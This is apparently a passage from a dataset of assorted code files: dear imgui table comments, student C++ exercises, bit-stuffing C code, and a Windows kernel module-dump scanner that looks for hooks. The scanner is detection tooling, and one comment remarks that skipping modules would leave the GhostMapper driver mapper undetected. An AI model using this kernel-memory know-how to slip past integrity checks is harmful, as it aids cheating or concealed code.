0xa6, 0xec, 0x66, 0x54, 0x16, 0x3a, 0x1c, 0xd8,\n            0xf9, 0x4a, 0x46, 0xea, 0x90, 0x1c, 0xb9, 0x74,\n            0x35, 0x4b, 0xa6, 0x87, 0xf2, 0x14, 0x73, 0xd2,\n            0x01, 0x88, 0x73, 0x6b, 0x84, 0x25, 0xbc, 0xa6,\n            0x03, 0xcd, 0xf8, 0xc2, 0x14, 0xfb, 0x78, 0xc2,\n            0xf3, 0x87, 0x62, 0xcf, 0x1c, 0x81, 0x3b, 0x19,\n            0xba, 0x0c, 0x6b, 0x85, 0x79, 0x0a, 0x90, 0x92,\n            0xc5, 0x83, 0x2c, 0x73, 0xc6, 0xff, 0xf0, 0x41,\n            0x08, 0xd8, 0x81, 0xda, 0x4b, 0xab, 0x40, 0x05,\n            0x4d, 0x45, 0x21, 0x24, 0x93, 0x29, 0x96, 0x80,\n            0xe5, 0x02, 0x06, 0xd7, 0x3c, 0x22, 0x27, 0x63,\n            0xe4, 0x19, 0x64, 0x93, 0x85, 0x33, 0x5d, 0x60,\n            0x74, 0xb8, 0x66, 0x0f, 0x69, 0xa8, 0x2c, 0x5a,\n            0x99, 0xbc, 0x7c, 0x59, 0x8c, 0x5e, 0x43, 0x3d,\n            0x23, 0x72, 0xbd, 0x50, 0xdc, 0x0d, 0x75, 0x98,\n            0x92, 0x28, 0xca, 0x42, 0x11, 0x52, 0x56, 0x13,\n            0x60, 0x74, 0xd8, 0xb0, 0xbc, 0xfa, 0x7b, 0x24,\n            0xdb, 0x47, 0xaa, 0x7d, 0x89, 0x41, 0x62, 0xbb,\n            0x3b, 0x44, 0xa9, 0x48, 0xb1, 0x3b, 0x66, 0xeb,\n            0x50, 0x66, 0xd1, 0x71, 0xa3, 0x0d, 0xa8, 0x0d,\n            0xb1, 0xe0, 0x6a, 0x2a, 0x62, 0x3a, 0x65, 0x07,\n            0xa6, 0x40, 0x23, 0x3b, 0x7e, 0xe4, 0x3d, 0x4c,\n            0x67, 0xbc, 0x0c, 0x1b, 0xbc, 0x38, 0x8b, 0x40,\n            0x39, 0x50, 0x07, 0x84, 0xd2, 0xc6, 0xe3, 0x93,\n            0x48, 0x4e, 0xe3, 0xbe, 0x61, 0x32, 0x5e, 0x42,\n            0xf3, 0xc3, 0xda, 0x00, 0x60, 0x69, 0x9c, 0x1b,\n            0xd0, 0x9b, 0x69, 0xb4, 0x5b, 0x22, 0x64, 0x64,\n            0xa0, 0x8d, 0x65, 0x80, 0x0a, 0x26, 0xb9, 0xec,\n            0x54, 0x60, 0x51, 0x7b, 0x15, 0xff, 0xbc, 0xca,\n            0x9b, 0x22, 0x1f, 0xb3, 0x0b, 0x2c, 0x9e, 0xf1,\n            0xa6, 0xc7, 0xea, 0x1c, 0x31, 0x81, 0xa0, 0x5a,\n            0x78, 0x5b, 0x73, 0xcc, 0xa2, 0x2a, 0x26, 0x31,\n            0x72, 0x48, 0x82, 0x33, 0xba, 0xba, 0x10, 0x86,\n            0x6d, 0xf8, 0xa7, 0x91, 0xf9, 0x06, 0x55, 0x0c,\n            0xb7, 0x5a, 0xa1, 0xb8, 0x1f, 0x36, 0xfc, 0x7b,\n            0x6f, 0x56, 0x14, 0xd3, 0",
    "// dear imgui, v1.91.2 WIP\r\n// (tables and columns code)\r\n\r\n/*\r\n\r\nIndex of this file:\r\n\r\n// [SECTION] Commentary\r\n// [SECTION] Header mess\r\n// [SECTION] Tables: Main code\r\n// [SECTION] Tables: Simple accessors\r\n// [SECTION] Tables: Row changes\r\n// [SECTION] Tables: Columns changes\r\n// [SECTION] Tables: Columns width management\r\n// [SECTION] Tables: Drawing\r\n// [SECTION] Tables: Sorting\r\n// [SECTION] Tables: Headers\r\n// [SECTION] Tables: Context Menu\r\n// [SECTION] Tables: Settings (.ini data)\r\n// [SECTION] Tables: Garbage Collection\r\n// [SECTION] Tables: Debugging\r\n// [SECTION] Columns, BeginColumns, EndColumns, etc.\r\n\r\n*/\r\n\r\n// Navigating this file:\r\n// - In Visual Studio: CTRL+comma (\"Edit.GoToAll\") can follow symbols inside comments, whereas CTRL+F12 (\"Edit.GoToImplementation\") cannot.\r\n// - In Visual Studio w/ Visual Assist installed: ALT+G (\"VAssistX.GoToImplementation\") can also follow symbols inside comments.\r\n// - In VS Code, CLion, etc.: CTRL+click can follow symbols inside comments.\r\n\r\n//-----------------------------------------------------------------------------\r\n// [SECTION] Commentary\r\n//-----------------------------------------------------------------------------\r\n\r\n//-----------------------------------------------------------------------------\r\n// Typical tables call flow: (root level is generally public API):\r\n//-----------------------------------------------------------------------------\r\n// - BeginTable()                               user begin into a table\r\n//    | BeginChild()                            - (if ScrollX/ScrollY is set)\r\n//    | TableBeginInitMemory()                  - first time table is used\r\n//    | TableResetSettings()                    - on settings reset\r\n//    | TableLoadSettings()                     - on settings load\r\n//    | TableBeginApplyRequests()               - apply queued resizing/reordering/hiding requests\r\n//    | - TableSetColumnWidth()                 - apply resizing width (for mouse resize, often requested by previous frame)\r\n//    |    - TableUpdateColumnsWeightFromWidth()- recompute columns weights (of stretch columns) from their respective width\r\n// - TableSetupColumn()                         user submit columns details (optional)\r\n// - TableSetupScrollFreeze()                   user submit scroll freeze information (optional)\r\n//-----------------------------------------------------------------------------\r\n// - TableUpdateLayout() [Internal]             followup to BeginTable(): setup everything: widths, columns positions, clipping rectangles. Automatically called by the FIRST call to TableNextRow() or TableHeadersRow().\r\n//    | TableSetupDrawChannels()                - setup ImDrawList channels\r\n//    | TableUpdateBorders()                    - detect hovering columns for resize, ahead of contents submission\r\n//    | TableBeginContextMenuPopup()\r\n//    | - TableDrawDefaultContextMenu()         - draw right-click context menu contents\r\n//-----------------------------------------------------------------------------\r\n// - TableHeadersRow() or TableHeader()         user submit a headers row (optional)\r\n//    | TableSortSpecsClickColumn()             - when left-clicked: alter sort order and sort direction\r\n//    | TableOpenContextMenu()                  - when right-clicked: trigger opening of the default context menu\r\n// - TableGetSortSpecs()                        user queries updated sort specs (optional, generally after submitting headers)\r\n// - TableNextRow()                             user begin into a new row (also automatically called by TableHeadersRow())\r\n//    | TableEndRow()                           - finish existing row\r\n//    | TableBeginRow()                         - add a new row\r\n// - TableSetColumnIndex() / TableNextColumn()  user begin into a cell\r\n//    | TableEndCell()                          - close existing column/cell\r\n//    | TableBeginCell()                        - enter into current column/cell\r\n// - [...]                                      user emit contents\r\n//-----------------------------------------------------------------------------\r\n// - EndTable()                                 user ends the table\r\n//    | TableDrawBorders()                      - draw outer borders, inner vertical borders\r\n//    | TableMergeDrawChannels()                - merge draw channels if clipping isn't required\r\n//    | EndChild()                              - (if ScrollX/ScrollY is set)\r\n//-----------------------------------------------------------------------------\r\n\r\n//-----------------------------------------------------------------------------\r\n// TABLE SIZING\r\n//-----------------------------------------------------------------------------\r\n// (Read carefully because this is subtle but it does make sense!)\r\n//-----------------------------------------------------------------------------\r\n// About 'outer_size':\r\n// Its meaning needs to differ slightly depending on if we are using ScrollX/ScrollY flags.\r\n// Default value is I",
    "#define _CRT_SECURE_NO_WARNINGS\n#include <iomanip>\n#include <iostream>\n#include <cstring>\n#include <limits>\n\nusing namespace std;\n#include \"Menu.h\"\nnamespace sdds {\n\n\tMenuItem::MenuItem() {\n\t\tm_item = nullptr;\n\t}\n\n\tMenuItem::MenuItem(const char* value) {\n\t\tif (value != nullptr) {\n\n\t\t\tm_item = new char[strlen(value) + 1];\n\t\t\tstrcpy(m_item, value);\n\t\t}\n\t\telse\n\t\t{\n\t\t\tm_item = nullptr;\n\t\t}\n\t\t\n\t}\n\n\tMenuItem::~MenuItem()\n\t{\n\t\tif (m_item != nullptr)\n\t\t{\n\t\t\tdelete[] m_item;\n\t\t\tm_item = nullptr;\n\t\t}\n\t}\n\n\tMenuItem::operator bool() const {\n\n\t\tif (m_item != nullptr)\n\t\t{\n\t\t\treturn true;\n\t\t}\n\t\treturn false;\n\t}\n\n\tMenuItem::operator const char* () const {\n\n\t\treturn m_item;\n\n\t}\n\n\tostream& MenuItem::display(std::ostream& out) {\n\n\t\tif (m_item != nullptr)\n\t\t{\n\t\t\tout << m_item;\n\t\t}\n\n\t\treturn out;\n\t}\n\n\tMenu::Menu() {\n\t\tm_counter = 0;\n\t}\n\n\tMenu::Menu(const char* title) : m_title(title) {};\n\n\tMenu::~Menu() {\n\t\tint i = 0;\n\t\tfor (i = 0; i < MAX_MENU_ITEMS; i++)\n\t\t{\n\t\t\tdelete m_items[i];\n\t\t\tm_items[i] = nullptr;\n\t\t}\n\t}\n\n\tostream& Menu::displayTitle(std::ostream& out) {\n\n\t\tif (m_title != nullptr) {\n\t\t\tm_title.display(out);\n\t\t}\n\t\treturn out;\n\t}\n\tostream& Menu::displayMenu(std::ostream& out) {\n\n\t\tif (m_title != nullptr) {\n\n\t\t\tdisplayTitle(out); \n\t\t\tstd::cout << std::endl;\n\n\t\t}\n\n\t\t int i;\n\t\tfor (i = 0; i < m_counter; i++)\n\t\t{\n\t\t\tout.width(2);\n\t\t\tout.setf(ios::right);\n\t\t\tout.fill(' ');\n\t\t\tout << i + 1 << \"- \";\n\t\t\tout.unsetf(ios::right);\n\t\t\tm_items[i]->display(out);\n\t\t\tout << std::endl;\n\t\t}\n\t\tout << \" 0- Exit\" << std::endl;\n\t\tout << \"> \";\n\n\t\treturn out;\n\t}\n\n\tint getInput(int min, int max, const char* prompt) {\n\t\tint userInput;\n\t\tbool success = false;\n\t\twhile (success == false)\n\t\t{\n\t\t\tcin >> userInput;\n\t\t\tif (!cin || userInput < min || userInput > max)\n\t\t\t{\n\t\t\t\tstd::cout << prompt;\n\t\t\t\tcin.clear();\n\t\t\t\tcin.ignore(1000, '\\n');\n\t\t\t\tsuccess = false;\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tsuccess = true;\n\t\t\t}\n\n\t\t}\n\t\treturn userInput;\n\t}\n\n\n\tint Menu::run() {\n\n\t\t\n\t\tdisplayMenu(std::cout);\n\t\tint selection;\n\t\tstd::cin >> selection;\n\t\twhile (std::cin.fail() || selection < 0 || selection > m_counter) {\n\t\t\tstd::cin.clear();\n\t\t\tstd::cin.ignore(80, '\\n');\n\t\t\tstd::cout << \"Invalid Selection, try again: \";\n\t\t\tstd::cin >> selection;\n\t\t}\n\t\treturn selection;\n\t}\n\n\tint Menu::operator~(){\n\t\treturn run();\n\t}\n\n\tMenu& Menu::operator<<(const char* menuitemConent) {\n\t\t\n\t\tif (m_counter < MAX_MENU_ITEMS)\n\t\t{\n\t\t\tm_items[m_counter] = new MenuItem(menuitemConent);\n\t\t\tm_counter++;\n\t\t}\n\n\t\t\n\t\treturn*this;\n\t}\n\n\tMenu::operator int()\n\t{\n\t\treturn m_counter;\n\t}\n\n\tMenu::operator unsigned int()\n\t{\n\t\treturn m_counter;\n\t}\n\n\tMenu::operator bool() {\n\n\t\tif (m_counter)\n\t\t{\n\t\t\treturn true;\n\t\t}\n\n\t\treturn false;\n\n\t}\n\n\tstd::ostream& operator<<(std::ostream& cout, Menu& menu)\n\t{\n\t\treturn menu.displayTitle(cout);\n\t}\n\n\tconst char* Menu::operator[]( int index) const\n\t{\n\t\tif (index > m_counter)\n\t\t{\n\t\t\treturn m_items[index %= m_counter]->m_item;\n\t\t}\n\t\telse\n\t\t{\n\t\t\treturn m_items[index]->m_item;\n\t\t}\n\t}\n\n}",
    "#include <iostream>\n#include <string>\n#include <cstdlib>\n#include <ctime>\n#include <chrono>\n#include <thread>\n\nusing namespace std;\n\nconst int numStats = 6; // Number of stats per class\nstring statNames[numStats] = { \"Attack\", \"Defense\", \"Mana\", \"Speed\", \"Health\", \"SPower\" };\nconst int numClasses = 4; // Number of classes\nstring classTypes[numClasses] = { \"Knight\", \"Mage\", \"Archer\", \"Thief\" };\nint classStats[numClasses][numStats] = {\n    {5, 8, 1, 3, 10, 3},  // Knight\n    {2, 3, 15, 3, 4, 8},  // Mage\n    {6, 3, 2, 6, 5, 10},  // Archer\n    {4, 4, 3, 10, 5, 6}   // Thief\n};\nconst int numEnemies = 6; // Number of enemies\nstring enemyNames[numEnemies] = { \"Soldier-1\", \"Soldier-2\", \"Soldier-3\", \"Soldier-4\", \"Soldier-5\", \"General\" }; // Enemy Names\nint enemyData[numEnemies][numStats] = {\n\t{2, 3, 4, 5, 6, 8}, // Enemy 1 Stats\n    {2, 3, 4, 5, 6, 8}, // Enemy 2 Stats\n    {1, 2, 3, 4, 5, 8}, // Enemy 3 Stats\n    {1, 2, 3, 4, 5, 8}, // Enemy 4 Stats\n    {2, 3, 4, 5, 6, 8}, // Enemy 5 Stats\n    {2, 3, 4, 5, 6, 8}  // Enemy 6 Stats\n};\nstring pName;\nint pStats[numStats] = { 0, 0, 0, 0, 0, 0 }, currentMaxStats[numStats] = { 0, 0, 0, 0, 0, 0 };\nint pClass = -1, enemyChoice = -1, enemyStats[numStats] = { 0, 0, 0, 0, 0, 0 };\nint pLevel = 0, pExp = 0, healthPotionCount = 3, checkPoint = 0;\nstring sLine = \"\";\nbool bDodgeAttempt = false, inGameLoop = false;\n\nstring animatedPrint(string message, int userInput = -1, double delayBetweenChars = 0.03, double delayBetweenLine = 1, bool newLine = true, bool bold = false) {\n    if (bold == true)\n        cout << \"\\033[1m\";\n    for (char c : message) {\n        cout << c;\n        cout.flush();\n        if (c != '\\n')\n            this_thread::sleep_for(chrono::milliseconds(int(delayBetweenChars * 1000)));\n        else\n            this_thread::sleep_for(chrono::milliseconds(int(delayBetweenLine * 1000)));\n    }\n    cout << \"\\033[0m\";\n    if (newLine == true)\n        cout << endl;\n    if (userInput == -1)\n        return \"\";\n    if (userInput == 0) {\n        string Input;\n        cin >> Input;\n        return Input;\n\t}\n\twhile (true) {\n\t\tint intInput;\n\t\tcin >> intInput;\n\t\tif (std::cin.fail()) { // If the input is not an integer\n\t\t\tstd::cin.clear(); // Clear the error flag\n\t\t\tstd::cin.ignore(10000, '\\n'); // Ignore invalid input\n\t\t\tstd::cout << \"Invalid input. Please enter a valid integer.\\n\";\n\t\t}\n\t\telse {\n\t\t\tstd::cin.ignore(10000, '\\n'); // Ignore any remaining input\n\t\t\treturn to_string(intInput);\n\t\t}\n\t}\n    return \"\";\n}\n\nint indexInList(string item, string itemList[], int size) {\n    for (int i = 0; i < size; i++) {\n        if (itemList[i] == item) \n            return i;\n    }\n    return -1;\n}\n\nstring listToText(string itemList[], int size) {\n    string combinedText = (size == 0) ? \"\" : \"\\n\";\n    for (int i = 0; i < size; i++) {\n        combinedText += to_string(i) + \") \" + itemList[i] + \"\\n\";\n    }\n    return combinedText;\n}\n\nint checkMenuRange(string question, string listName[], int size, bool isCanceable = false) {\n    int index = -1;\n    index = stoi(animatedPrint(question + listToText(listName, size) + sLine + \"\\n\", 1, 0.025, 0.04, false));\n    bool validInput = false;\n    while (!validInput) {\n        if (isCanceable == true && index == -1)\n            return -1;\n        else if (index < 0 || index >= size) {\n            animatedPrint(\"Invalid Choice! Please Try Again!\");\n            index = stoi(animatedPrint(question + listToText(listName, size) + sLine + \"\\n\", 1, 0.025, 0.04, false));\n        }\n        else\n            return index;\n    }\n    return index;\n}\n\nvoid starLine(int numRows, double timeWait, int newLineCount = 0) {\n    for (int i = 0; i < numRows; i++) {\n        cout << string(15, '=') << endl;\n        this_thread::sleep_for(chrono::milliseconds(int(timeWait * 1000)));\n    }\n    for (int i = 0; i < newLineCount; i++)\n        cout << endl;\n}\n\nvoid showHealthPotions() {\n    if (healthPotionCount == 0) \n        animatedPrint(\"You have no health potions left!\");\n    else \n        animatedPrint(\"You have \" + to_string(healthPotionCount) + \"x Health Potions in your Inventory!\");\n}\n\nint clampValue(int value, int minimum, int maximum = 100) {\n    return max(minimum, min(maximum, value));    \n}\n\nvoid useHealthPotion() {\n    showHealthPotions();\n    if (healthPotionCount == 0) \n        return;\n    pStats[4] = clampValue(pStats[4] + 5, 0, currentMaxStats[4]);\n    if (pStats[4] == currentMaxStats[4]) \\\n        animatedPrint(pName + \" Has Fully Recovered!\");\n    else \n        animatedPrint(pName + \" has been Healed for 5 HP\");\n    animatedPrint(pName + \" Now Has \" + to_string(pStats[4]) + \" HP!\");\n    healthPotionCount -= 1;\n}\n\nvoid playerAttack(int enemyStats[]) {\n    string fightOptions[] = { \"Fight\", \"Heal\" };\n    int fightChoice = checkMenuRange(\"Your Turn: \", fightOptions, 2);\n    if (fightChoice == 0) {\n        string attackOptions[] = { \"Slash\", \"Stab\", \"Magic Bolt\", \"Special Attack\", \"Dodge\", \"Block\" };\n        int attackType = checkMenuRange(\"Choose Your Attack!\", attackOpti",
    "#include<bits/stdc++.h>\nusing namespace std;\n\nclass Node {\n    public:\n        int data;\n        Node *next;\n\n        Node(int data) {\n            this->data = data;\n            this->next = nullptr;\n        }\n};\n\n//insert element at end\nvoid insertAtTail(Node* &head, int data) {\n    \n    Node *newNode = new Node(data);\n\n    if(head == nullptr){\n        head = newNode;\n        return;\n    }\n\n    Node *curr = head;\n\n    while(curr->next != nullptr) {\n        curr = curr->next;\n    }\n    curr->next = newNode;\n}\n\n//insert at head\nvoid insertAtHead(Node* &head, int data) {\n    Node *newNode = new Node(data);\n    newNode->next = head;\n    head = newNode;\n}\n\n//searching in the linked list\nbool search(Node* head, int key) {\n    Node *temp = head;\n\n    while(temp != nullptr) {\n        if(temp->data == key)\n            return true;\n\n        temp = temp->next;\n    }\n    return false;\n}\n\n//delete from the linked list\nvoid deleteElement(Node* &head, int data) {\n    Node *temp = head;\n    \n    while(temp->next->data != data) {\n        temp = temp->next;\n    }\n\n    temp->next = temp->next->next;\n    // delete todelete;\n}\n\nvoid printList(Node* head) {\n    Node *curr = head;\n\n    while(curr != nullptr) {\n        cout << curr->data << \" \";\n        curr = curr->next;\n    }\n    cout << endl;\n}\n\nint main()\n{\n    Node *head = nullptr;\n    insertAtTail(head, 1); \n    insertAtTail(head, 2); \n    insertAtTail(head, 3); \n    insertAtTail(head, 4); \n    insertAtTail(head, 6);\n    deleteElement(head, 4);\n\n    printList(head);\n    // cout << search(head, 4) << endl;\n    // cout << search(head, 9) << endl;\n    return 0;\n}\n",
    "#include <iostream>\n#include <optional>\n#include <string>\n#include <string_view>\n#include <utility>\n\n#include \"post.hpp\"\n\nbool Post::isValidMarkupInt(int i)\n{\n    switch(i)\n    {\n    case COMMONMARK:\n    case ASCIIDOC:\n        return true;\n    }\n    return false;\n}\n\nstd::string Post::markupToStr(Markup m)\n{\n    switch(m)\n    {\n    case COMMONMARK:\n        return \"CommonMark\";\n    case ASCIIDOC:\n        return \"AsciiDoc\";\n    }\n    std::unreachable();\n}\n\nstd::optional<Post::Markup> Post::markupFromStr(std::string_view m)\n{\n    if(m == \"CommonMark\")\n    {\n        return Post::COMMONMARK;\n    }\n    if(m == \"AsciiDoc\")\n    {\n        return Post::ASCIIDOC;\n    }\n    return std::nullopt;\n}\n\nstd::ostream& operator<<(std::ostream& stream, const Post& p)\n{\n    stream << \"Title: \" << p.title << \"\\n\"\n           << \"Abstract: \" << p.abstract << \"\\n\"\n           << \"Markup: \" << Post::markupToStr(p.markup) << \"\\n\"\n           << \"Language: \" << p.language << \"\\n\"\n           << \"Author: \" << p.author;\n    return stream;\n}\n",
    "/*\r\nCreate class SavingsAccount. Use a static variable annualInterestRate to\r\nstore the annual interest rate for all account holders. Each object of the class\r\ncontains a private instance variable savingsBalance indicating the amount\r\nthe saver currently has on deposit. Provide method\r\ncalculateMonthlyInterest() to calculate the monthly interest by multiplying\r\nthe savingsBalance by annualInterestRate divided by 12.This interest\r\nshould be added tosavingsBalance. Provide a static method\r\nmodifyInterestRate() that sets the annualInterestRate to a new value. Write\r\na program to test class SavingsAccount. Instantiate two savingsAccount\r\nobjects, saver1 and saver2, with balances of Rs2000.00 and Rs3000.00,\r\nrespectively. Set annualInterestRate to 4%, then calculate the monthly\r\ninterest and print the new balances for both savers. Then set the\r\nannualInterestRate to 5%, calculate the next month\u2019s interest and print the\r\nnew balances for both savers\r\n*/\r\n\r\n#include <iostream>\r\nusing namespace std;\r\nclass savingAccount\r\n{\r\n    static float annualIntrestRate;\r\n    float savingBalance;\r\n    float temp;\r\n\r\npublic:\r\n    savingAccount(int x)\r\n    {\r\n        savingBalance = x;\r\n        temp = x;\r\n        cout<<\"Your Balance is : \"<<savingBalance<<endl;\r\n    }\r\n    void calculateMonthlyIntrest()\r\n    {\r\n        savingBalance = savingBalance + (savingBalance * annualIntrestRate) / 12;\r\n    }\r\n    static void modifyIntrestRate(float x)\r\n    {\r\n        annualIntrestRate = x;\r\n    }\r\n    void display()\r\n    {\r\n        cout << \" Your Total Saving Balance at \"<<annualIntrestRate*100<<\"% : \" << savingBalance << endl;\r\n        savingBalance = temp;\r\n    }\r\n}; \r\n\r\nfloat savingAccount :: annualIntrestRate = 0.00;\r\n\r\nint main()\r\n{\r\n    savingAccount sv1(2000);\r\n    savingAccount::modifyIntrestRate(0.04);\r\n    sv1.calculateMonthlyIntrest();\r\n    sv1.display();\r\n    savingAccount::modifyIntrestRate(0.05);\r\n    sv1.calculateMonthlyIntrest();\r\n    sv1.display();\r\n\r\n\r\n    savingAccount  sv2(3000);\r\n    savingAccount::modifyIntrestRate(0.04);\r\n    sv2.calculateMonthlyIntrest();\r\n    sv2.display();\r\n    savingAccount::modifyIntrestRate(0.05);\r\n    sv2.calculateMonthlyIntrest();\r\n    sv2.display();\r\n}",
    "#include \"scan.h\"\n\n#define DMP_FULL     0x0001\n#define DMP_CODEONLY 0x0002\n#define DMP_READONLY 0x0004\n#define DMP_RAW      0x0008\n#define DMP_RUNTIME  0x0010\n\nnamespace scan\n{\n\tstatic void compare_sections(QWORD local_image, QWORD runtime_image, DWORD diff);\n\tstatic BOOL dump_module_to_file(std::vector<FILE_INFO> &modules, DWORD pid, FILE_INFO file);\n\tstatic void scan_w32khooks(QWORD win32k_dmp, FILE_INFO &win32k, std::vector<FILE_INFO> &modules);\n\tstatic void scan_krnlhooks(QWORD ntoskrnl_dmp, std::vector<FILE_INFO> &modules);\n\n\tstatic PVOID dump_module(DWORD pid, QWORD base, DWORD dmp_type);\n\tstatic void  free_module(PVOID dumped_module);\n\n}\n\nvoid scan::image(BOOL save_cache, std::vector<FILE_INFO> modules, DWORD pid, FILE_INFO file, BOOL use_cache)\n{\n\tif (save_cache)\n\t{\n\t\tdump_module_to_file(modules, pid, file);\n\t\treturn;\n\t}\n\n\t//\n\t// optional: optimize scan for rtcore.sys by skipping kernel modules + making GhostMapper UD again\n\t//\n\t/*\n\tif (pid == 0 || pid == 4)\n\t{\n\t\tPCSTR target_modules[] = {\n\t\t\t\"ntoskrnl.exe\",\n\t\t\t\"win32k.sys\",\n\t\t\t\"win32kbase.sys\",\n\t\t\t\"win32kfull.sys\",\n\t\t\t\"dxgkrnl.sys\",\n\t\t\t\"storport.sys\",\n\t\t\t\"storahci.sys\",\n\t\t\t\"stornvme.sys\",\n\t\t\t\"clipsp.sys\"\n\t\t};\n\n\t\tBOOL found = 0;\n\t\tfor (auto &target : target_modules)\n\t\t{\n\t\t\tif (strstr(file.name.c_str(), target))\n\t\t\t{\n\t\t\t\tfound = 1;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\n\t\tif (!found)\n\t\t{\n\t\t\treturn;\n\t\t}\n\t}\n\t*/\n\n\t//\n\t// dump image\n\t//\n\tQWORD runtime_image = (QWORD)dump_module(pid, file.base, DMP_FULL | DMP_RUNTIME);\n\tif (runtime_image == 0)\n\t{\n\t\tLOG_RED(\"failed to scan %s\\n\", file.path.c_str());\n\t\treturn;\n\t}\n\n\tLOG(\"scanning: %s\\n\", file.path.c_str());\n\n\tif (pid == 4 || pid == 0)\n\t{\n\t\tif (!_strcmpi(file.name.c_str(), \"win32k.sys\"))\n\t\t{\n\t\t\tscan_w32khooks(runtime_image, file, modules);\n\t\t}\n\n\t\tif (!_strcmpi(file.name.c_str(), \"ntoskrnl.exe\"))\n\t\t{\n\t\t\tscan_krnlhooks(runtime_image, modules);\n\t\t}\n\t}\n\n\t//\n\t// try to use existing memory dumps\n\t//\n\tHMODULE local_image = 0;\n\n\tif (use_cache)\n\t{\n\t\tlocal_image = (HMODULE)LoadImageEx((\"./dumps/\" + file.name).c_str(), 0, file.base, runtime_image);\n\t\tif (local_image == 0)\n\t\t{\n\t\t\tlocal_image = (HMODULE)LoadImageEx(file.path.c_str(), 0, file.base, runtime_image);\n\t\t}\n\t}\n\telse\n\t{\n\t\tconst char *sub_str = strstr(file.path.c_str(), \"\\\\dump_\");\n\n\t\tif (sub_str)\n\t\t{\n\t\t\tstd::string sub_name = sub_str + 6;\n\t\t\tstd::string resolved_path;\n\n\t\t\tfor (auto &lookup : modules)\n\t\t\t{\n\t\t\t\tif (!_strcmpi(lookup.name.c_str(), sub_name.c_str()))\n\t\t\t\t{\n\t\t\t\t\tresolved_path = lookup.path;\n\t\t\t\t}\n\t\t\t}\n\n\t\t\tif (resolved_path.size() < 1)\n\t\t\t{\n\t\t\t\tresolved_path = \"C:\\\\Windows\\\\System32\\\\Drivers\\\\\" + sub_name;\n\t\t\t}\n\n\t\t\tfile.path = resolved_path;\n\t\t}\n\n\t\tlocal_image = (HMODULE)LoadImageEx(file.path.c_str(), 0, file.base, runtime_image);\n\t}\n\n\tif (local_image == 0)\n\t{\n\t\tLOG_RED(\"failed to scan %s\\n\", file.path.c_str());\n\t\tfree_module((PVOID)runtime_image);\n\t\treturn;\n\t}\n\n\tDWORD min_difference = 1;\n\n\tcompare_sections((QWORD)local_image, runtime_image, min_difference);\n\n\tfree_module((PVOID)runtime_image);\n\n\tFreeImageEx((void *)local_image);\n}\n\nQWORD get_dump_export(PVOID dumped_module, PCSTR export_name)\n{\n\tQWORD a0;\n\tDWORD a1[4]{};\n\n\n\tQWORD base = (QWORD)dumped_module;\n\n\n\ta0 = base + *(WORD*)(base + 0x3C);\n\tif (a0 == base)\n\t{\n\t\treturn 0;\n\t}\n\n\tDWORD wow64_off = *(WORD*)(a0 + 0x4) == 0x8664 ? 0x88 : 0x78;\n\n\ta0 = base + (QWORD)*(DWORD*)(a0 + wow64_off);\n\tif (a0 == base)\n\t{\n\t\treturn 0;\n\t}\n\n\tstatic int cnt=0;\n\tcnt++;\n\n\tmemcpy(&a1, (const void *)(a0 + 0x18), sizeof(a1));\n\twhile (a1[0]--)\n\t{\n\t\ta0 = (QWORD)*(DWORD*)(base + a1[2] + ((QWORD)a1[0] * 4));\n\t\tif (a0 == 0)\n\t\t{\n\t\t\tcontinue;\n\t\t}\n\n\t\tif (!_strcmpi((const char*)(base + a0), export_name))\n\t\t{\n\t\t\ta0 = *(WORD*)(base + a1[3] + ((QWORD)a1[0] * 2)) * 4;\n\t\t\ta0 = *(DWORD*)(base + a1[1] + a0);\n\t\t\treturn (QWORD)((QWORD)dumped_module + a0);\n\t\t}\n\t}\n\treturn 0;\n}\n\nstatic void scan::scan_w32khooks(QWORD win32k_dmp, FILE_INFO& win32k, std::vector<FILE_INFO>& modules)\n{\n\tFILE_INFO win32kfull{};\n\tFILE_INFO win32kbase{};\n\n\tfor (auto& mod : modules)\n\t{\n\t\tif (!_strcmpi(mod.name.c_str(), \"win32kfull.sys\"))\n\t\t{\n\t\t\twin32kfull = mod;\n\t\t}\n\t\tif (!_strcmpi(mod.name.c_str(), \"win32kbase.sys\"))\n\t\t{\n\t\t\twin32kbase = mod;\n\t\t}\n\t}\n\n\tif (win32kfull.base == 0)\n\t\treturn;\n\n\tQWORD win32kfull_dmp = (QWORD)dump_module(4, win32kfull.base, DMP_FULL | DMP_RUNTIME);\n\tif (win32kfull_dmp == 0)\n\t\treturn;\n\n\tQWORD Win32kApiSetTable = get_dump_export((PVOID)win32k_dmp, \"ext_ms_win_moderncore_win32k_base_sysentry_l1_table\");\n\tWin32kApiSetTable = Win32kApiSetTable + 0x70;\n\n\n\ttypedef struct {\n\t\tQWORD table_address;\n\t\tQWORD* table_names;\n\t\tQWORD unk; // win11 only\n\t} TABLE_ENTRY;\n\n\tTABLE_ENTRY* table = (TABLE_ENTRY*)(Win32kApiSetTable);\n\n\tDWORD next_off = sizeof(TABLE_ENTRY);\n\t// win10, poor way\n\tif (table->unk != 0) next_off -= 8;\n\n\tstd::vector<FILE_INFO> wl_modules;\n\twl_modules.push_back(win32kfull);\n\twl_modules.push_back(win32kbase);\n\twl_modules.push_back(win32k);\n\n\n\tdo\n\t{\n\t\tQWORD* temp = (QWORD*)((QWORD)table->table_names - win32k.base + win32k_dmp);\n\t\tPCSTR  table_name = (PCSTR)(temp",
    "#include <stdio.h>\r\n#include <stdint.h>\r\n#include <string.h>\r\n\r\n// Function to perform bit stuffing\r\nvoid bitStuffing(uint8_t *input, size_t inputLength, uint8_t *output, size_t *outputLength) {\r\n    size_t outputIndex = 0;\r\n    size_t bitCount = 0;\r\n    uint8_t flagSequence[1] = {0x7E}; // Flag sequence (01111110)\r\n\r\n    // Start with flag sequence\r\n    output[outputIndex++] = flagSequence[0];\r\n\r\n    // Process each byte of input data\r\n    for (size_t i = 0; i < inputLength; i++) {\r\n        uint8_t currentByte = input[i];\r\n        for (int j = 7; j >= 0; j--) {\r\n            if ((currentByte >> j) & 1) {\r\n                bitCount++;\r\n                if (bitCount == 5) {\r\n                    // Stuff a 0 bit after five consecutive 1s\r\n                    output[outputIndex++] = 0;\r\n                    bitCount = 0;\r\n                }\r\n            } else {\r\n                bitCount = 0;\r\n            }\r\n            output[outputIndex++] = (currentByte >> j) & 1;\r\n        }\r\n    }\r\n\r\n    // End with flag sequence\r\n    output[outputIndex++] = flagSequence[0];\r\n\r\n    *outputLength = outputIndex;\r\n}\r\n\r\nvoid printHex(uint8_t *data, size_t length) {\r\n    for (size_t i = 0; i < length; i++) {\r\n        printf(\"%02X \", data[i]);\r\n    